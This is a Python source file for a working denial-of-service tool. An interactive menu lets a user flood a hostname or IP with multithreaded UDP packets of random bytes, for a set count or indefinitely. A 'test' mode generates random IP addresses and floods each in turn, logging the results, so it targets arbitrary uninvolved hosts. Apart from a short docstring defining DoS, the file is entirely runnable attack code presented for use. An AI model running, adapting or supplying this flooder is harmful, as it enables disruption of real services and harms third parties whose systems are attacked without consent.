"""
A DoS (Denial of Service) is a type of cyber attack in which a single computer or device overwhelms a server, system, or network 
by sending a large volume of malicious requests,
preventing legitimate users from accessing the service.
Unlike a DDoS (Distributed Denial of Service),
which uses multiple machines to amplify the attack, a DoS is simpler and can be more easily identified and blocked.
This attack can expand the scope of
"""
from colorama import Fore, init #color in terminal
import random
import socket
import threading

from urllib.parse import urlparse

import logging
# modules local
from modules.https.https import https

# test
from modules.generate_random_ip.generate_random_ip import generate_random_ip
# ip atack
from modules.ip_atack.ip_atack import ip_attack
# validar porta
from modules.validar_porta.validar_porta import validar_porta
# validar quantidade
import json
from modules.validar_quantidade.validar_quantidade import validar_quantidade


def test_ddos_with_ips():
    """
    Tests the code with several valid random IPs and generates a log report.
    """
    print(Fore.CYAN + "Starting DDoS tests with random IPs...")
    logging.basicConfig(
        filename='report/report.log',
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s'
    )

    with open('config.json', 'r') as config_file:
        config = json.load(config_file)
    quantity_ips = config["quantity_ips"]
    door = config["door"]
    quantity_packages = config["quantity_packages"]

    logging.info("Starting DDoS tests with random IPs.")

    for i in range(quantity_ips):
        ip = generate_random_ip()
        try:
            logging.info(f"Testing attack on IP: {ip}, Porta: {door}, Pacotes: {quantity_packages}")
            print(Fore.YELLOW + f"Testing attack on IP: {ip}, Porta: {door}, Pacotes: {quantity_packages}")
            main_ddos(ip, door, quantity_packages)
            logging.info(f"IP attack {ip} successfully completed.")
        except Exception as e:
            logging.error(f"Error attacking IP {ip}: {e}")
            print(Fore.RED + f"Error attacking IP {ip}: {e}")

    logging.info("Tests completed. Report generated in relatorio.log.")
    print(Fore.CYAN + "Tests completed. Report generated in relatorio.log.")

def execute_attack(target, bytes, quantidade):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sent_packages = 0

    try:
        if quantidade == 0:
            print(Fore.YELLOW + "attacking indefinitely... press Ctrl+C to stop")
            while True:
                sock.sendto(bytes, target)
                sent_packages += 1
                print(Fore.GREEN + f"package sent... total: {sent_packages}")
        else:
            for _ in range(quantidade):
                sock.sendto(bytes, target)
                sent_packages += 1
                print(Fore.GREEN + f"package sent... total: {sent_packages}")
    except KeyboardInterrupt:
        print(Fore.CYAN + "attack interrupted by user")
    except Exception as e:
        print(Fore.RED + f"error during attack: {e}")
    finally:
        sock.close()

def main_ddos(hostname, door, quantidade):
    if not hostname or not door:
        print(Fore.RED + "invalid entry closing...")
        return

    try:
        ip = socket.gethostbyname(hostname)
        target = (ip, door)
        print(Fore.YELLOW + f"Initiating attack on target {target[0]}:{target[1]}")
        bytes = random._urandom(1490)

        threads = []
        num_threads = 5

        for _ in range(num_threads):
            thread = threading.Thread(target=execute_attack, args=(target, bytes, quantidade))
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

        print(Fore.CYAN + "attack completed")
    except socket.gaierror:
        print(Fore.RED + "Invalid hostname could not resolve IP")
    except Exception as e:
        print(Fore.RED + f"a general error has occurred: {e}")
init(autoreset=True)





def panel():
    while True:
        try:
            option = int(input(Fore.CYAN + """
             ██████╗ ██████╗  ██████╗ ███████╗
            ██╔══██╗██╔══██╗██╔═══██╗██╔════╝
            ██║  ██║██║  ██║██║   ██║███████╗
            ██║  ██║██║  ██║██║   ██║╚════██║
            ██████╔╝██████╔╝╚██████╔╝███████║
            ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
            [1] to attack with HTTPS
            [2] to attack with IP
            [3] to test ddos
            [0] quit
            Option:"""))
            
            if option == 1: 
                hostname, door, quantidade = https(validar_porta, validar_quantidade)
                if hostname is not None and door is not None and quantidade is not None: 
                     main_ddos(hostname, door, quantidade)
                else:
                    print(Fore.RED + "invalid input https atack")
    
            elif option == 2:
                ip, door, quantidade = ip_attack(validar_porta, validar_quantidade)
                if ip is not None and door is not None and quantidade is not None:
                    main_ddos(ip, door, quantidade)
                else:
                    print(Fore.RED + "Invalid input for IP attack.")

            elif option == 3:
                print(Fore.CYAN + "Option 3 selected: Testing DDoS with random IPs...")
                test_ddos_with_ips()
                break
            elif option == 0:
                print(Fore.CYAN + "leaving...")
                break
            else:
                print(Fore.RED + "invalid option try again")
        except ValueError:
            print(Fore.RED + "error: please enter a valid number")
        except Exception as e:
            print(Fore.RED + f"An unexpected error occurred: {e}")
panel()
